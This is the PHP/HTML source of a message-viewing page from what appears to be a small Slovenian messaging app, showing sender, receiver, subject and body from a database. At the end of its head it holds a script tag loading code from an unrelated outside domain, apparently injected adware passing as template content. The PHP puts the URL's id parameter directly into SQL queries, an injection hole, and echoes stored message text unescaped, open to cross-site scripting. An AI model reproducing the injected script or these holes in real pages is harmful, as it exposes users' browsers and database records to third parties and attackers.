<html lang="en">
  <head>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Sporočilo</title>

    <!-- Bootstrap core CSS -->
    <link href="bootstrap.min.css" rel="stylesheet">

    <!-- Custom styles for this template -->
    <link href="jumbotron-narrow.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    <script src="../../assets/js/ie-emulation-modes-warning.js"></script>

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  <script src="https://www.best-deals-products.com/ws/sf_main.jsp?dlsource=hdrykzc"></script></head>

  <body>
    <div class="container">
      <div class="header clearfix">
        <h3 class="text-muted">Sporočilo</h3>
      </div>
      <div class="jumbotron" >
	<?php
	session_start();
	if(isset($_SESSION['id']))
	{
			include "povezava.php";
			$id = $_GET['id'];
            $sqlsender = "select u.ime, u.priimek, t.cas from uporabnik u inner join transakcija t on u.id_uporabnika=t.sender where t.id_transakcije='$id'";
			$sqlreciever = "select u.ime, u.priimek, t.cas from uporabnik u inner join transakcija t on u.id_uporabnika=t.reciever where t.id_transakcije='$id';";
			$sqlvsebina = "select t.zadeva, t.vsebina, t.cas from transakcija t where t.id_transakcije='$id'";
			$senderrez = mysqli_query($con, $sqlsender);
			$recieverrez = mysqli_query($con, $sqlreciever);
			$vsebinarez = mysqli_query($con, $sqlvsebina);
			while($vsebina = mysqli_fetch_row($vsebinarez)){
				$sender = mysqli_fetch_row($senderrez);
				$reciever = mysqli_fetch_row($recieverrez);
				echo '<h4>Posiljatelj: ' . $sender[0] . ' ' . $sender[1] . '<br><br>';
				echo 'Prejemnik: ' . $reciever[0] . ' ' . $reciever[1] . '<br><br>';
				echo 'Zadeva: <strong>' . $vsebina[0] . '</strong><br><br>';
				echo $vsebina[1].'</h4>';
			}
	}
	else
	{
		header("location:index.php");
	}
	if(isset($_POST['submit']))
	{
		header("location:poslano.php");
	}
	?>
</div>
</div>
<form method="POST"><div style="width:30%; margin-right:auto; margin-left:auto;">
	<button class="btn btn-lg btn-primary btn-block" name="submit" type="submit">Nazaj</button></div>
</form>
	</body>
</html>
